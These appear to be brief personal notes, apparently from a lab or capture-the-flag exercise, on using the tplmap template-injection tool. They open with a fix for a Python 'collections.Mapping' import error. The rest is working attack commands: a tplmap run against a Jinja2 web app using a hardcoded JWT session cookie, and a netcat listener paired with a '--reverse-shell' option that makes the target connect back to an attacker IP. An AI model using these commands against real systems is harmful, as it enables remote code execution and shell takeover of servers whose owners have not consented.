##### module 'collections' has no attribute 'Mapping' : 
https://github.com/epinna/tplmap/issues/104
```
hello the solution is go to core/plugin.py and change "import collections" to "import collections.abc" then down in line 21 22 change collections.abc.Mapping instead of collections.Mapping.
```


#### USE

- TEST
```bash
python tplmap.py -c " token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTcwNDUyNzkxOX0.KtuFKaZNjEwUEugH0imfpGGUUld7W_T3IfA94j5pPmY" -u http://192.168.55.13:8080 -e Jinja2 -d "name=QWE&desc=*"
```

- Reverse-Shell
```bash
nc -lvvp 2233
python tplmap.py -c " token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTcwNDUyNzkxOX0.KtuFKaZNjEwUEugH0imfpGGUUld7W_T3IfA94j5pPmY" -u http://192.168.55.13:8080 -e Jinja2 -d "name=QWE&desc=*" --reverse-shell 192.168.55.3 2233
```
